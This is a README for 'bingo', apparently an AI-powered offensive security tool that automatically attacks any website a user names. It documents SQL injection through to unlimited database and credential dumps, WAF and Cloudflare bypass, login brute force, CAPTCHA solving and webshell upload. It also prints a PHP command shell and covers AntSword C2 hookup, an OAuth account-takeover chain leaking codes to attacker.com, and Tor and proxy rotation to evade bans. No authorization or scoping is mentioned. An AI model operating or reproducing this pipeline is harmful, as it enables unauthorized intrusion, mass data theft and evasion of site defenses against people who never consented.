<div align="center">

<img src="assets/logo.png" width="150" alt="bingo logo"/>

# bingo

**AI-Powered Red Team Terminal**

[![Version](https://img.shields.io/badge/version-3.2.65-brightgreen)](https://github.com/bingook/bingo/releases)
[![Python](https://img.shields.io/badge/python-3.12-blue)](https://python.org)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)

**🌐 Language:** [English](README.md) · [한국어](README_ko.md) · [中文](README_zh.md)

> ⚠️ **Windows is NOT supported.** bingo runs on **macOS and Linux only.**
> Windows support has been permanently discontinued as of v3.2.45.

*DeepSeek · Claude · GPT · GLM · Qwen · Ollama · Custom*

</div>

---

## Install

```bash
pip install bingo-ai
bingo
```

**Update:**
```bash
bingo --update
```

**Git clone:**
```bash
git clone https://github.com/bingook/bingo.git
cd bingo && bash install.sh
```

---

## Quick Start

```bash
bingo                        # Launch
bingo scan https://target    # Auto full scan
bingo --version
bingo --reset
```

First launch: select language → enter API key → start.

---

## How to Use

Just type your target and task in the chat window. No commands needed.

**Example prompt (paste into bingo):**
```
Target: https://example.com

Tasks:
1. Full recon — detect WAF, DB type, tech stack
2. SQLi — error → union → blind → time-based
3. Admin credentials — dump admin/user/member tables
4. Admin login — screenshot proof
5. DB full dump — run DbDumper on success
```

> Just describe what you want. AI decides everything automatically.

---

## Core Capabilities

| Area | What bingo does |
|------|----------------|
| **Recon** | WAF detection, tech fingerprinting, crawl all pages/JS/API endpoints |
| **SQLi** | Error-based → Union → Boolean blind → Time-based (all DB types) |
| **WAF Bypass** | Cloudflare / AWS WAF / ModSecurity — auto-selected bypass |
| **XSS** | Stored / Reflected / DOM — session hijack on success |
| **SSRF** | Cloud metadata (AWS/GCP/Azure) endpoint testing |
| **File Upload** | Extension bypass, webshell upload |
| **Auth Attack** | Login brute force, SQLi auth bypass, CAPTCHA auto-solve |
| **IDOR/BOLA** | Object ID enumeration, horizontal privilege escalation |
| **JWT/OAuth** | alg:none, weak secret, redirect_uri abuse, **open client registration chain ATO** (v3.2.65) |
| **GraphQL** | Introspection, batch attack, field injection |
| **HTTP Smuggling** | CL.TE / TE.CL desync |
| **Credential Dump** | Extract hashes → suggest hashcat command |
| **DB Dump** | Full table dump on confirmed SQLi (DbDumper v2.7) |
| **Screenshot** | Admin panel auto-screenshot via Playwright |
| **Report** | Auto-saved markdown report with CVSS scores |

---

## Supported AI Models

| Provider | Example models |
|----------|---------------|
| OpenAI | `gpt-4o`, `gpt-4-turbo`, `o1` |
| Anthropic | `claude-3-5-sonnet`, `claude-opus-4` |
| DeepSeek | `deepseek-chat`, `deepseek-reasoner` |
| GLM | `glm-4`, `glm-5` |
| Qwen | `qwen-max`, `qwen-plus` |
| Ollama | any local model |
| Custom | any OpenAI-compatible endpoint |

---

## WAF Bypass — Auto Selected

| WAF | Bypass used |
|-----|------------|
| Cloudflare | Double URL encode → Unicode → UA spoof |
| AWS WAF | Encoding → SLEEP→subquery → XFF header |
| ModSecurity | Space/**/ → IF→CASE WHEN → mixed case |
| Nginx/OpenResty | `%0a` newline → comment → obfuscation |
| Chinese WAF | Null byte → overlong UTF-8 → function replace |

---

## Burp Engine — 자동 실행 / 自动触发 / Auto-Triggered (v3.2.51)

### 🇰🇷 한국어

URL + 취약점 키워드가 입력에 함께 있으면 **Burp 엔진이 자동 실행**됩니다. 별도 명령 불필요.

```
bingo> https://target.com sqli 찾아줘
bingo> https://target.com xss 테스트
bingo> https://target.com rce 익스플로잇
```

자동 트리거 키워드: `sqli` `xss` `rce` `ssrf` `xxe` `inject` `payload` `fuzz` `scan` `exploit` `oob`

> **URL이 없으면 실행 안 됨.** URL + 키워드 둘 다 필요.

---

### 🇨🇳 中文

URL 与漏洞关键词同时出现时，**Burp 引擎自动触发**，无需手动命令。

```
bingo> https://target.com sqli渗透
bingo> https://target.com xss测试
bingo> https://target.com rce利用
```

自动触发关键词：`sqli` `xss` `rce` `ssrf` `xxe` `inject` `payload` `fuzz` `scan` `exploit` `oob`

> **没有 URL 则不触发。** URL 与关键词缺一不可。

---

### 🇺🇸 English

**Burp Engine auto-runs** when a URL and a vulnerability keyword appear together. No extra command needed.

```
bingo> https://target.com sqli test
bingo> https://target.com xss scan
bingo> https://target.com rce exploit
```

Auto-trigger keywords: `sqli` `xss` `rce` `ssrf` `xxe` `inject` `payload` `fuzz` `scan` `exploit` `oob`

> **No URL = no trigger.** Both URL and keyword are required.

---

## Anti-Hallucination — 4-Layer Guard

Every AI response is blocked unless it passes all 4 checks:

1. **Code block guard** — rejects empty stubs, JSON plans
2. **Text intercept** — rejects AI self-confessions
3. **Fake credential block** — no credentials without HTTP proof
4. **Unproven conclusion block** — no "SQLi confirmed" without code execution

Evidence labels in reports:

| Label | Meaning |
|-------|---------|
| `✅ VERIFIED` | Real HTTP response confirmed |
| `🟡 LIKELY` | Partial evidence |
| `🔍 INFERRED` | Reasoning only — verify manually |

---

## `bingo scan` — Full Auto Pipeline

```bash
bingo scan https://target.com
```

Runs 5 phases automatically, no interaction needed:

| Phase | What happens |
|-------|-------------|
| 1. Recon | Tech fingerprint, WAF detect, endpoint map |
| 2. Collect | Admin panels, sensitive files, parameter discovery |
| 3. Test | SQLi / LFI / XSS / SSRF / IDOR probing |
| 4. Exploit | WAF bypass, data extraction, credential dump |
| 5. Report | Markdown report with CVSS scores + evidence |

Report saved to: `~/.config/bingo/reports/report_<domain>.md`

---

## Proxy Pool Rotation (v3.2.18)

Automatically rotates IP addresses to bypass WAF bans, rate limits, and IP blocks.

### Supported Proxy Types

| Type | Format | Notes |
|------|--------|-------|
| HTTP | `http://ip:port` | Basic proxy |
| HTTP + Auth | `http://user:pass@ip:port` | With credentials |
| HTTPS | `https://ip:port` | SSL tunnel |
| SOCKS5 | `socks5://ip:port` | Requires PySocks |
| SOCKS5h | `socks5h://ip:port` | DNS also through proxy (more anonymous) |
| Tor | `socks5h://127.0.0.1:9050` | Tor Browser / `tor` daemon |
| API | URL string | Auto-fetch from ProxyScrape, Webshare, custom |

### Quick Start

```bash
# Add a single proxy
/proxy add socks5://1.2.3.4:1080

# Enable Tor (must have Tor running: brew install tor && tor)
/proxy tor

# Fetch free proxies from API presets automatically
/proxy api

# Load a proxy list file (one proxy per line)
/proxy file ~/proxies.txt

# Check pool status
/proxy list
```

### All `/proxy` Sub-commands

| Command | Description |
|---------|-------------|
| `/proxy list` | Show pool status + all proxies |
| `/proxy add <url>` | Add a single proxy manually |
| `/proxy file <path>` | Load proxies from text file (one per line) |
| `/proxy api [url]` | Auto-fetch from API URL or choose preset |
| `/proxy tor [password]` | Enable Tor mode (optional: control port password) |
| `/proxy rotate` | Force immediate switch to next proxy |
| `/proxy test` | Test current proxy connection (latency check) |
| `/proxy unban` | Unban all banned proxies (reset fail marks) |
| `/proxy clear` | Clear entire pool |
| `/proxy off` | Disable proxy (requests go direct) |

### How Auto-Rotation Works

When bingo detects a ban (HTTP 429, 403, IP block, connection reset):

```
1. ProxyManager.report_ban() marks current proxy as BANNED
2. Switches to the next available proxy automatically
3. If Tor mode: sends NEWNYM signal → new Tor circuit (new IP)
4. Injects new proxy URL into AI hint so next script uses it
5. Waits 3s (vs 15s without proxy) and retries
```

AI-generated scripts automatically receive:
```python
# [PROXY_ROTATED: now using socks5://5.6.7.8:9090]
PROXIES = {'http': 'socks5://5.6.7.8:9090', 'https': 'socks5://5.6.7.8:9090'}
session.get(url, proxies=PROXIES, timeout=15, verify=False)
```

### Tor Setup Guide

**Step 1 — Install Tor:**
```bash
# macOS
brew install tor && brew services start tor

# Ubuntu/Debian
sudo apt install tor && sudo systemctl start tor
```

**Step 2 — (Optional) Enable Tor Control Port:**  
Edit `/etc/tor/torrc` (Linux) or `/usr/local/etc/tor/torrc` (macOS):
```
ControlPort 9051
CookieAuthentication 1
```
Then restart: `sudo systemctl restart tor`

**Step 3 — Enable in bingo:**
```bash
/proxy tor           # no password (cookie auth)
/proxy tor mypassword  # with HashedControlPassword
```

**Step 4 — Install stem for circuit rotation:**
```bash
pip install stem
```
Without `stem`, Tor still works but circuit rotation (new IP per ban) is disabled.

### API Preset Fetching

```bash
/proxy api
```
Choose from built-in presets:
```
1. ProxyScrape (SOCKS5) — free, 5000+ proxies
2. ProxyScrape (HTTP)   — free, HTTP proxies
3. ProxyScrape (SOCKS4) — free, SOCKS4 proxies
4. GeoNode Free         — filtered, 90%+ uptime
0. Custom URL           — enter your own API endpoint
```

Or specify URL directly:
```bash
/proxy api https://api.proxyscrape.com/v3/...
/proxy api https://your-own-proxy-api.com/list.txt
```

Supported API response formats:
- Plain text, one proxy per line (`ip:port` or `scheme://ip:port`)
- JSON array: `["socks5://1.2.3.4:1080", ...]`

### Proxy in AI-Generated Scripts

When `/proxy` is active, every AI script automatically includes:

```python
import requests

# [bingo v3.2.18: PROXY ACTIVE]
PROXIES = {'http': 'socks5://1.2.3.4:1080', 'https': 'socks5://1.2.3.4:1080'}
s = requests.Session()
s.proxies.update(PROXIES)
s.verify = False   # required for Tor / self-signed certs

r = s.get("https://target.com/api/...", timeout=15)
```

### Requirements

```bash
pip install PySocks  # SOCKS5 proxy support (auto-installed)
pip install stem     # Tor circuit rotation (optional)
```

Both are included in `pyproject.toml` dependencies — installed automatically with bingo.

---

## Commands

Type `/` in the chat to open command menu (arrow keys to navigate).

| Command | What it does |
|---------|-------------|
| `/scan <url>` | Full red team pipeline |
| `/waf <url>` | WAF detection + bypass only |
| `/crack [hash]` | Hash crack — online lookup → offline |
| `/proxy [sub]` | **Proxy pool rotation** (new v3.2.18) |
| `/stop` | Stop running task |
| `/tools` | Show all tools + install status |
| `/tools install <name>` | Install a specific tool |
| `/tools install all` | Install all missing tools at once |
| `/model` | Add or switch AI model |
| `/skill <keyword>` | Search skill knowledge base |
| `/history` | View conversation history |
| `/export` | Save conversation as `.md` |
| `/config` | View current settings |
| `/lang` | Change language (ko / zh / en) |
| `/clear` | Clear screen |
| `/quit` | Exit |

**Tool install examples:**
```bash
/tools                        # See all tools
/tools install nmap           # Auto-install nmap
/tools install nuclei ffuf    # Install multiple
/tools install all            # Install everything
```

**Hash crack examples:**
```bash
/crack                              # Auto-extract from last response
/crack $2y$10$Eix...               # Crack specific hash
/crack -w ~/rockyou.txt             # Custom wordlist
```

---

## Config & Data Storage

| Path | Content |
|------|---------|
| `~/.config/bingo/config.json` | API keys, model, language |
| `~/.config/bingo/reports/` | Auto-saved scan reports |
| `~/.config/bingo/sessions/` | Chat session history |
| `~/.bingo/tools/` | Auto-downloaded Go tools |
| `BINGO_REPORTS_DIR` | Override report path (env var) |

**Config file locations by OS:**

| OS | Path |
|----|------|
| macOS | `~/Library/Application Support/bingo/config.json` |
| Linux | `~/.config/bingo/config.json` |

---

## Mobile — APK / IPA Analysis (v2.2.8)

bingo can analyze Android APK and iOS IPA files directly from the chat window.

### Android APK

```bash
# In bingo chat
bingo> analyze target.apk
bingo> target.apk secret scan
bingo> pentest com.example.app
```

| Method | Speed | Command |
|--------|-------|---------|
| TruffleHog native | ⚡ 9× faster | `bingo> target.apk trufflehog` |
| jadx full decompile | Thorough | `bingo> target.apk jadx full scan` |

**CLI / Python:**
```bash
trufflehog filesystem target.apk --json --no-verification
# Docker (no install needed):
docker run -v $(pwd):/work trufflesecurity/trufflehog:latest filesystem /work/target.apk --json
```

**Install TruffleHog:**
```bash
brew install trufflesecurity/trufflehog/trufflehog   # macOS
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin  # Linux
```

### iOS IPA

```bash
# In bingo chat
bingo> analyze target.ipa
bingo> ios swift decompile target.ipa
bingo> malimite target.ipa
```

**Requires:** Java 17+ and Malimite.jar
```bash
brew install openjdk@17
# Download Malimite.jar from https://github.com/LaurieWired/Malimite/releases
mkdir -p ~/tools && mv ~/Downloads/Malimite.jar ~/tools/
java -jar ~/tools/Malimite.jar target.ipa --output ./decompiled/
trufflehog filesystem ./decompiled/ --json --no-verification
```

### Auto-detect (APK or IPA)

```bash
bingo> auto scan target.apk    # AI picks the right method automatically
bingo> auto scan target.ipa
```

### What bingo extracts

| Item | Detail |
|------|--------|
| Hardcoded secrets | AWS keys, Google API, Firebase, Stripe, JWT, GitHub token |
| Permissions | All declared + dangerous permissions |
| Exported components | Activities, Services, Receivers, Providers |
| Deep links / URL schemes | Intent filters, custom scheme handlers |
| Network endpoints | API URLs extracted from code + assets |
| SSL pinning | Detected → bypass guide auto-generated |
| 3rd party SDKs | Firebase, Sentry, Analytics, etc. |

---

## Post-Exploitation — Webshell Deploy (v2.2.5)

After confirmed SQLi, bingo runs the full post-exploit chain automatically:

**Chain:** `SQLi login bypass → file upload → webshell → AntSword connect`

```bash
# In bingo chat — just describe the goal
bingo> I have SQLi on https://target.com/login — get admin access and deploy webshell
```

bingo handles each step:

| Step | What happens |
|------|-------------|
| 1. SQLi auth bypass | `admin'--` / `' OR 1=1--` injected into login form |
| 2. Session capture | Auth cookies saved automatically |
| 3. File upload | Webshell uploaded via authenticated upload endpoint |
| 4. Webshell test | `id`, `whoami`, `uname -a` executed to confirm RCE |
| 5. AntSword config | Connection string printed for AntSword C2 |
| 6. DB full dump | DbDumper runs automatically after shell confirmed |

**Webshell types auto-selected:**

| Backend | Webshell |
|---------|----------|
| PHP | `<?php system($_GET['cmd']); ?>` |
| JSP | Runtime.exec() shell |
| ASPX | ProcessStartInfo shell |

---

## DB Dump (v2.9.6)

Triggered automatically after confirmed SQLi / webshell / RCE:

- Dumps: `member` / `user` / `admin` / `g5_member` / `xe_member`
- **No row limit** — `max_rows_per_table=0` (unlimited), entire table dumped
- Saves credentials → `CREDENTIALS_{table}.json`
- Detects hash type → prints `hashcat -m {mode}` command
- Re-attempts admin login with extracted credentials

**Save location (auto-detected by OS):**

| OS | Path |
|----|------|
| macOS | `~/Desktop/dump/{target}_{timestamp}/` |
| Windows | `~/Desktop/dump/{target}_{timestamp}/` (OneDrive Desktop auto-detected) |
| Linux | `~/Desktop/dump/{target}_{timestamp}/` (falls back to `~/dump/` if no Desktop) |

> **v2.9.6 fix:** AI-generated extraction code was saving to `/tmp/` and ignoring DbDumper.
> Now enforced: `/tmp/` forbidden, Desktop path mandatory, FLOOR injection `query_fn` template added.

---

## XSS Scan (v2.9.6)

bingo detects reflected and stored XSS automatically:

- Scans all parameters for reflection contexts (HTML / Attribute / JS / URL)
- **Deduplicates reflection positions** — same context printed only once even if it appears multiple times in the HTML response
- Loop detector distinguishes legitimate scan output from actual infinite loops
- Outputs: `Reflection at: {param}={context}` + unique count

**Why this matters:** some pages reflect the same XSS probe tens of times in a single response. Previous versions triggered the infinite-loop kill after 5 identical lines. v2.9.5 raises the threshold to 25 for scan result lines and enforces deduplication in the AI-generated scan code.

---

## OAuth Open Client Registration Chain Attack (v3.2.65)

bingo v3.2.65 adds **`sec-web-oauth-open-reg`** — a full attack chain for the critical OAuth misconfiguration where unauthenticated dynamic client registration enables account takeover.

### Attack Chain

```
/.well-known/oauth-authorization-server
        ↓
  registration_endpoint (no auth required)
        ↓
  Attacker registers client → gets client_id + client_secret
        ↓
  Authorization request with attacker redirect_uri
        ↓
  Victim clicks → authorization code sent to attacker.com
        ↓
  Token exchange (PKCE not enforced)
        ↓
  Wildcard CORS → cross-origin token read
        ↓
  Account Takeover ✓
```

### What bingo checks automatically

| Check | Skill covers |
|-------|-------------|
| `/.well-known/oauth-authorization-server` metadata probe | ✅ |
| `registration_endpoint` unauthenticated access | ✅ |
| `redirect_uri` whitelist bypass | ✅ |
| PKCE (`code_challenge`) enforcement | ✅ |
| `Access-Control-Allow-Origin: *` + Credentials | ✅ |
| Authorization code hijack PoC | ✅ |

### Usage

```
bingo skill show sec-web-oauth-open-reg
bingo skill search oauth
```

---

## DApp / Web3 / Smart Contract Audit (v3.2.62)

bingo now includes **28 dedicated DApp/Web3/Smart Contract audit skills** — auto-triggered when Web3 keywords are detected.

### Auto-trigger Keywords

Any input containing these keywords automatically loads the Web3 skill context:

`web3` `dapp` `defi` `nft` `smart contract` `solidity` `blockchain` `ethereum` `abi` `metamask` `walletconnect` `wagmi` `ethers` `viem` `reentrancy` `flash loan` `oracle` `erc20` `erc721` `delegatecall` `selfdestruct` `ecrecover` `swc-`

No extra command needed — just describe your DApp target.

```bash
bingo> audit https://app.uniswap.org smart contract
bingo> https://defi-target.com reentrancy vulnerability check
bingo> analyze solidity contract for flash loan attack
bingo> dapp pentest https://app.example.com  # auto wallet generation + SIWE login
```

### DApp Audit Skills (28 total)

| # | Skill ID | What it does |
|---|----------|-------------|
| 1 | `web3-dapp-fingerprint` | Technology stack fingerprint (ethers/web3.js/wagmi/viem) |
| 2 | `web3-rpc-enum` | Ethereum JSON-RPC endpoint enumeration + exposure detection |
| 3 | `web3-abi-extract` | Contract ABI + function signature extraction without wallet |
| 4 | `web3-reentrancy` | SWC-107 reentrancy detection (Slither pattern) |
| 5 | `web3-integer-overflow` | SWC-101 integer overflow/underflow detection |
| 6 | `web3-access-control` | SWC-105 unprotected functions + ownership takeover |
| 7 | `web3-tx-order-dependency` | SWC-114 frontrunning / TX order dependency |
| 8 | `web3-flash-loan` | Flash loan attack vector analysis (price oracle manipulation) |
| 9 | `web3-oracle-manipulation` | On-chain oracle manipulation / TWAP bypass |
| 10 | `web3-signature-replay` | SWC-121 signature replay / EIP-712 missing |
| 11 | `web3-delegate-call` | SWC-112 delegatecall storage slot collision |
| 12 | `web3-selfdestruct` | SWC-106 selfdestruct misuse + forced ether send |
| 13 | `web3-unchecked-call` | SWC-104 unchecked low-level call return value |
| 14 | `web3-timestamp-dependence` | SWC-116 block timestamp dependence |
| 15 | `web3-private-data` | SWC-136 private storage data exposure |
| 16 | `web3-wallet-connect-enum` | WalletConnect/MetaMask DApp API enumeration without wallet |
| 17 | `web3-graphql-subgraph` | DApp GraphQL subgraph query vulnerabilities |
| 18 | `web3-nft-metadata-ssrf` | NFT metadata SSRF / URI manipulation |
| 19 | `web3-defi-full-pipeline` | Full DeFi attack pipeline (auto-selected) |
| 20 | `web3-contract-audit` | Smart contract comprehensive audit report |
| 21 | `web3-blind-signing-audit` | EIP-712/7730 blind signing audit (Trail of Bits / Bybit pattern) |
| 22 | `web3-safe-multisig-optype` | Safe multisig operation-type tampering (Bybit $1.5B hack vector) |
| 23 | `web3-frontend-injection` | DApp frontend JS injection / address swapping (EtherDelta pattern) |
| 24 | `web3-weak-randomness` | SWC-120 weak on-chain randomness (block.timestamp/blockhash predictable) |
| 25 | `web3-dos-gas-limit` | SWC-128 gas limit DoS / unbounded loop / external dependency DoS |
| 26 | `web3-wallet-gen` | **[v3.2.62]** Instantly generate a test Ethereum wallet (address + private key) |
| 27 | `web3-siwe-auth` | **[v3.2.62]** Sign-In with Ethereum (EIP-4361) — auto DApp login |
| 28 | `web3-dapp-full-auth` | **[v3.2.62]** Wallet gen → SIWE login → session token → full API pentest pipeline |

### Key Vulnerability Coverage

| Vulnerability | SWC | Severity | Coverage |
|---------------|-----|----------|----------|
| Reentrancy | SWC-107 | CRITICAL | ✅ |
| Integer Overflow | SWC-101 | HIGH | ✅ |
| Unprotected Functions | SWC-105 | CRITICAL | ✅ |
| Delegatecall Collision | SWC-112 | HIGH | ✅ |
| Signature Replay | SWC-121 | HIGH | ✅ |
| Timestamp Dependence | SWC-116 | MEDIUM | ✅ |
| Weak Randomness | SWC-120 | HIGH | ✅ |
| Gas Limit DoS | SWC-128 | HIGH | ✅ |
| Blind Signing (EIP-7730) | — | HIGH | ✅ |
| Safe Op-Type Tampering | — | CRITICAL | ✅ (Bybit vector) |
| Frontend JS Injection | — | CRITICAL | ✅ (EtherDelta pattern) |
| Flash Loan Attack | — | CRITICAL | ✅ |
| Oracle Manipulation | — | CRITICAL | ✅ |
| NFT Metadata SSRF | — | HIGH | ✅ |
| DApp Auth Bypass (SIWE) | — | HIGH | ✅ *new* |
| IDOR/BOLA on Auth APIs | — | HIGH | ✅ *new* |

### DApp Authentication — Wallet Generation + SIWE Login (v3.2.62)

Most DApps require a wallet connection before any API access. bingo now handles this automatically:

```
bingo> pentest this DApp: https://app.target.com

# bingo automatically:
# 1. [web3-wallet-gen]      Generates a fresh test Ethereum wallet (no real funds)
# 2. [web3-siwe-auth]       Signs EIP-4361 challenge → obtains session token
# 3. [web3-dapp-full-auth]  Tests ALL authenticated API endpoints (IDOR/BOLA/privilege escalation)
```

**How it works:**

```
All DApp APIs → 401 Unauthorized (without wallet)
                    ↓
           bingo creates test wallet
           Address: 0xAbCd... (new, empty)
                    ↓
       DApp sends sign challenge (EIP-4361)
                    ↓
       bingo signs with test wallet key
                    ↓
       Session token obtained → Bearer eyJ...
                    ↓
       bingo fuzzes ALL authenticated endpoints
       → IDOR / BOLA / privilege escalation testing
```

> ⚠️ **Safety**: bingo generates a **brand-new test wallet** with zero funds. No existing wallet or private key is ever required. Never send real ETH/tokens to the generated test address.

### Blind Signing / EIP-7730 (Bybit $1.5B Attack Vector)

The Bybit $1.5B hack (Feb 2025) exploited a Safe multisig blind signing flaw:
- Attackers changed `operation` parameter from `0` (call) → `1` (delegatecall)
- Signers could not detect the change on hardware wallets
- EIP-712 structured data was insufficient to prevent this

bingo's `web3-blind-signing-audit` and `web3-safe-multisig-optype` skills detect these patterns:

```
[CRITICAL] Operation Type UI Not Displayed
           Safe transaction operation type (0=call, 1=delegatecall) not shown in UI
           Fix: Display operation type explicitly in signing UI

[HIGH] EIP-7730 Not Implemented
       Hardware wallet cannot display human-readable transaction details
       Fix: Submit JSON manifest to https://github.com/LedgerHQ/clear-signing-erc7730-registry
```

### Example: DApp Full Pentest (with wallet auth)

```bash
# DApp that requires wallet login
bingo> https://app.defi-protocol.com dapp pentest

# bingo automatically:
# 1. Fingerprints DApp tech stack (ethers/wagmi/web3.js)
# 2. Generates test wallet: 0xNewAddress... (TEST ONLY — no real funds)
# 3. Performs SIWE login (EIP-4361) → gets session token
# 4. Tests all authenticated endpoints for IDOR/BOLA
# 5. Scans smart contracts for SWC vulnerabilities
# 6. Checks EIP-7730 blind signing compliance
# 7. Tests frontend for JS injection / address swapping
# 8. Generates full pentest report with severity ratings
```

---

## Cloudflare Bypass (Real IP Discovery)

```python
import requests, urllib3
urllib3.disable_warnings()
REAL_IP = "x.x.x.x"  # from SPF/DNS records
s = requests.Session()
s.verify = False
r = s.get(f"https://{REAL_IP}/", headers={"Host": "target.com"})
```

Find real IP: `dig TXT target.com` → look for SPF record IP.

---

## Changelog

| Version | Summary |
|---------|---------|
| v3.2.65 | **OAuth Open Client Registration Chain Attack** — `/.well-known/oauth-authorization-server` discovery → unauthenticated client registration → redirect_uri hijack → PKCE bypass → wildcard CORS → full account takeover chain (`sec-web-oauth-open-reg`); proxy deadlock fix (RLock); SyntaxWarning cleanup in DApp skills |
| v3.2.64 | Proxy deadlock fix (RLock), `skills_data15.py` SyntaxWarning cleanup |
| v3.2.62 | **DApp wallet auth** — test wallet generation, SIWE login (EIP-4361), full authenticated API pentest pipeline (28 skills total) |
| v3.2.61 | **DApp/Web3 audit** — 25 smart contract skills, EIP-7730 blind signing, Bybit Safe op-type, frontend injection, SWC-120/128 |
| v3.2.57 | Anti-hallucination labels (VERIFIED/LIKELY/INFERRED), Playwright JS detection, skill loading fixes |
| v3.2.45 | **macOS/Linux only** — Windows support permanently discontinued |
| v3.2.28 | Core engine restored — rolled back to most stable base |
| v3.2.18 | **Proxy Pool Rotation** — HTTP/HTTPS/SOCKS5/Tor/API, auto-rotate on ban, RULE 26-T |
| v3.2.17 | False positive fix: `Body: <!DOCTYPE html>` loop detector, RULE 26-S |
| v3.2.16 | CAPTCHA false positive fix — script tags excluded from detection |
| v3.2.15 | `NameError` prevention: RULE 26-Q — variables must be initialized before use |
| v3.2.14 | Login efficiency: pivot to JS analysis after 3× HTTP 500 (RULE 26-P) |
| v3.0.6 | SQLi extraction: auto IP-ban detection + X-Forwarded-For rotation (12 headers), partial dump on exhaustion |
| v3.0.5 | Fix: final report now saved to Desktop/dump/target/ instead of ~/.config/bingo/reports/ |
| v3.0.4 | Post-credential: admin page discovery + IP restriction bypass (header spoofing/SSRF/real-IP) + report |
| v3.0.3 | DB dump: DbDumper first → auto fallback to manual pagination if DbDumper fails or misses STEP 0 tables |
| v3.0.2 | DB dump: AI verifies member tables via actual sample data (SELECT LIMIT 5), not just column names |
| v3.0.1 | DB table identification: column-name based detection + obfuscated table support |
| v3.0.0 | DbDumper flexible usage — AI selects method by context (no WAF / WAF / WebShell) |
| v2.9.8 | Simplified save rules: /tmp/ allowed for intermediate files, Desktop for final output only |
| v2.9.7 | All final output files enforced to Desktop/dump/target/ |
| v2.9.6 | DB dump: forbid /tmp/ save, enforce Desktop path, add FLOOR injection query_fn template |
| v2.9.5 | XSS reflection dedup fix — prevent false infinite-loop kill on repeated reflections |
| v2.9.3 | DB dump: no row limit + Desktop save path (macOS/Windows auto-detect) |
| v2.9.2 | CMS bias fix — fresh detection per target, zero assumptions |
| v2.9.1 | Bug fixes: variable substitution, warning spam, false positives |
| v2.9.0 | 11 new modules: HTTP smuggling, GraphQL, OAuth/JWT, Playwright, alerts |
| v2.8.0 | SQLi engine overhaul — sqlmap-level precision |
| v2.7.0 | Auto DB dump on successful breach |
| v2.3.0 | Burp Engine — full Repeater/Intruder/Scanner in pure Python |
| v2.2.0 | Pentest Precision Engine — WAF bypass, CAPTCHA OCR |
| v2.1.0 | API fuzzing, post-report interactive actions |

---

## Languages

```bash
/lang        # Switch language in chat
```

| Language | Code |
|----------|------|
| English | `en` |
| 한국어 | `ko` |
| 中文 | `zh` |

---

## Requirements

- Python **3.12** (required for Playwright compatibility)
- API key for at least one supported model
- (Optional) VPN for anonymity — auto-detected and displayed

---

## Contributing

```bash
git clone https://github.com/bingook/bingo.git
cd bingo && bash install.sh
```

Pull requests welcome. Open an issue first for major changes.

---

## License

MIT © 2026 bingook

---

<div align="center">

**Type your target. bingo does the rest.**

</div>
